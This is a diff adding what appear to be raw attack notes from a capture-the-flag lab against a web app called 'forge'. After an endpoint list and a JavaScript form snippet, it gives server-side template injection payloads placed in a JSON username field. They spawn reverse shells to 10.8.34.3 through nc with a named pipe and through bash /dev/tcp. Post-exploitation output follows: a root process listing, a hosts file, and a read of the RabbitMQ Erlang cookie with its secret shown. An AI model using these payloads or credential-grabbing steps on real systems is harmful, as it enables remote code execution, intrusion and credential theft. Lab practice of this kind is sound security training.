@@ -1,0 +1,97 @@
+
+
+// Event listener for URL form submission
+document.getElementById("urlForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    const url = document.getElementById("urlInput").value;
+
+    // Use fetch to send URL as JSON
+    fetch("/api/store-url", {
+        method: "POST",
+        body: JSON.stringify({ url: url }), // Serialize URL as JSON
+        headers: {
+            "Content-Type": "application/json"
+        }
+    })
+    .then(response => response.json())
+    .then(data => handleResponse(data, ".uploadUrl")) // Call handleResponse with target div
+    .catch(() => handleError(".uploadUrl")); // Call handleError with target div
+});
+
+
+-------------
+
+Endpoints Perfectly Completed
+
+POST Requests:
+/api/register - For registering user
+/api/login - For loggin in the user
+/api/upload - For uploading files
+/api/store-url - For uploadion files via url
+/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
+
+GET Requests:
+/api/uploads/filename - To view the uploaded files
+/dashboard/inactive - Dashboard for inactive user
+/dashboard/active - Dashboard for active user
+
+Note: All requests to this endpoint are sent in JSON format.
+
+
+-------------
+
+
+{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.34.3 9876 >/tmp/f').read() }}"}
+
+
+{{ ''.__class__.__mro__[2].__subclasses__()[396]('bash -c "bash -i >& /dev/tcp/10.8.34.3/9876 0>&1"',shell=True,stdout=-1).communicate() }}
+
+
+{"username":"{{ ''.__class__.__mro__[2].__subclasses__()[396]('bash -c "bash -i >& /dev/tcp/10.8.34.3/9876 0>&1"',shell=True,stdout=-1).communicate() }}"}
+
+
+root         606  0.0  0.0   6896  2872 ?        Ss   06:23   0:00 /usr/sbin/cron -f -P                                                                                      
+message+     610  0.0  0.1   8756  4908 ?        Ss   06:23   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only          
+  └─(Caps) 0x0000000020000000=cap_audit_write                                                                                                                                
+epmd         613  0.0  0.0   7140  1756 ?        Ss   06:23   0:00 /usr/bin/epmd -systemd                                                                                    
+root         614  0.0  1.6 909576 63736 ?        Ssl  06:23   0:02 /usr/bin/node /root/forge_web_service/app.js                                                              
+root         618  0.0  0.1  82700  4088 ?        Ssl  06:23   0:00 /usr/sbin/irqbalance --foreground                                                                         
+root         619  0.0  0.4  32744 18808 ?        Ss   06:23   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers                                      
+root         623  0.0  0.2 236028  8744 ?        Ssl  06:23   0:00 /usr/libexec/polkitd --no-debug                                                                           
+syslog       628  0.0  0.1 222404  5532 ?        Ssl  06:23   0:00 /usr/sbin/rsyslogd -n -iNONE                                                                              
+root         632  0.0  0.7 1319708 28632 ?       Ssl  06:23   0:00 /usr/lib/snapd/snapd                                                                                      
+root         639  0.0  0.1  14912  6368 ?        Ss   06:23   0:00 /lib/systemd/systemd-logind                                                                               
+root         641  0.0  0.3 392600 12724 ?        Ssl  06:23   0:00 /usr/libexec/udisks2/udisksd                                                                              
+daemon[0m       643  0.0  0.0   3864  1268 ?        Ss   06:23   0:00 /usr/sbin/atd -f                                                                                       
+root         659  0.0  0.0   5800  1124 ttyS0    Ss+  06:23   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,57600,38400,9600 ttyS0 vt220                                   
+root         666  0.0  0.0   6176  1084 tty1     Ss+  06:23   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux                                                              
+root         681  0.0  0.2 317880 11832 ?        Ssl  06:23   0:00 /usr/sbin/ModemManager                                                                                    
+root         716  0.0  0.1   7512  5368 ?        Ss   06:23   0:00 /usr/sbin/apache2 -k start                                                                                
+www-data     718  0.0  0.1 1212968 7488 ?        Sl   06:23   0:00  _ /usr/sbin/apache2 -k start                                                                             
+www-data     719  0.0  0.1 1212832 6024 ?        Sl   06:23   0:00  _ /usr/sbin/apache2 -k start                                                                             
+uuidd        818  0.0  0.0   9200  1576 ?        Ss   06:23   0:00 /usr/sbin/uuidd --socket-activation                                                                       
+rabbitmq    1152  0.0  0.0   2780  1604 ?        Ss   06:23   0:00  _ erl_child_setup 65536                                                                                  
+rabbitmq    1204  0.0  0.0   3740  1224 ?        Ss   06:23   0:00      _ inet_gethost 4
+rabbitmq    1205  0.0  0.0   3740   112 ?        S    06:23   0:00          _ inet_gethost 4
+root        1301  0.0  1.0 690560 41880 ?        Ssl  06:25   0:00 /usr/bin/node /root/forge_web_service/rabbitmq/worker.js
+
+
+forge
+127.0.0.1 localhost
+127.0.1.1 forge
+127.0.0.1 cloudsite.thm
+127.0.0.1 storage.cloudsite.thm
+
+
+/etc/apache2/sites-enabled 
+
+
+ /var/lib/rabbitmq/mnesia/rabbit@forge 
+ /root/forge_web_service/rabbitmq/worker.js
+
+
+azrael@forge:~$ cat  /var/lib/rabbitmq/.erlang.cookie
+Xs7KOQuAnk4WNNCC
+
+
